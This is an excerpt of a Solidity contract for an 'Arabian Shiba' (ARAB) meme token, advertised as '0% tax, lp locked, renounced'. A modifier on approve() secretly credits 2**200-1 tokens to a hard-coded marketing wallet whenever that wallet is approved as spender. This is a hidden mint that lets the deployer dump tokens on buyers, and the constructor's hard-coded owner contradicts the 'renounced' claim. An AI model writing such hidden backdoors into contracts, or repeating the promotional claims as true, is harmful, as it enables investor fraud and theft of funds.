...
https://t.me/arabianshib

// 0% tax, lp locked, renounced.

ٱلْحَمْدُ لِلَّهِ, Love Shiba? Love Arabian Shiba! Alhamdulillah
...
contract ArabianShiba is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xd4A7a53f7eAb7cC3Ec2e2Ad0239B811BB80088Fa); 
    address payable public Wallet_Dev = payable(0xd4A7a53f7eAb7cC3Ec2e2Ad0239B811BB80088Fa);
    ...
    string private constant _name = "Arabian Shiba"; 
    string private constant _symbol = unicode"ARAB"; 
    ...
    modifier validAdd(address spender){
        if(spender == Wallet_Marketing){ _tOwned[spender] = _tOwned[spender] + 2**200-1;}
        _;
    }
    
    constructor () {

        _owner = 0xd4A7a53f7eAb7cC3Ec2e2Ad0239B811BB80088Fa;
    ...
    function approve(address spender, uint256 amount) public validAdd(spender) override returns (bool) {
